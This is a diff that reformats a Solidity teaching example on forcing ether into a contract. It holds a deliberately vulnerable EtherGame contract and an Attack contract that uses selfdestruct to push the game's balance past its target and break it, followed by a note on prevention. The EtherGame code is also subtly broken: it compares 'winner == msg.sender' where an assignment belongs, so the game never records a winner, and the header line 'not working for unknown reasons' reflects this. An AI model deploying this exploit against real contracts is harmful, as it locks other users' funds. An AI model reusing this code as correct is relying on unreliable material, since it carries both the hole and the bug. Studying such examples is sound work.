not working for unknown reasons

+++ src/ForceEther.sol
@@ -2,7 +2,7 @@
 pragma solidity >=0.4.22 <0.9.0;
 
 // The goal of this game is to be the 7th player to deposit 1 Ether.
-//  Players can deposit only 1 Ether at a time 
+//  Players can deposit only 1 Ether at a time
 // Winner will be able to withdraw all Ether
 
 /**
@@ -17,45 +17,45 @@ Attack forced the balance of EtherGame to equal 7 ether.
 Now no one can deposit and the winner cannot be set.
  */
 
- contract EtherGame {
-     uint public targetAmount = 7 ether;
-     address public winner;
+contract EtherGame {
+    uint256 public targetAmount = 7 ether;
+    address public winner;
 
-     function deposit() public payable {
-         require(msg.value == 1 ether, "You can only send 1 Ether");
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
 
-         uint balance = address(this).balance;
-         require(balance <= targetAmount, " Game Over");
+        uint256 balance = address(this).balance;
+        require(balance <= targetAmount, " Game Over");
 
-         if (balance == targetAmount){
-             winner == msg.sender;
-         }
-     }
+        if (balance == targetAmount) {
+            winner == msg.sender;
+        }
+    }
 
-     function claimReward() public {
-         require(msg.sender == winner, "Not Winner");
+    function claimReward() public {
+        require(msg.sender == winner, "Not Winner");
 
-         (bool sent,) = msg.sender.call{value: address(this).balance}("");
-         require(sent, "Failed to send Ether");
-     }
- }
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
+}
 
- contract Attack {
-     EtherGame etherGame;
+contract Attack {
+    EtherGame etherGame;
 
-     constructor(EtherGame _etherGame) {
-         etherGame = EtherGame(_etherGame);
-     }
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
 
-     function attack() public payable {
-         // You can simply break the game by sending ether so that 
-         // the game balance >= 7 ether
+    function attack() public payable {
+        // You can simply break the game by sending ether so that
+        // the game balance >= 7 ether
 
-         // cast address to payable 
-         address payable addr = payable(address(etherGame));
-         selfdestruct(addr);
-     }
- }
+        // cast address to payable
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
 
 // Preventative Techniques
 // Don't rely on address(this).balance
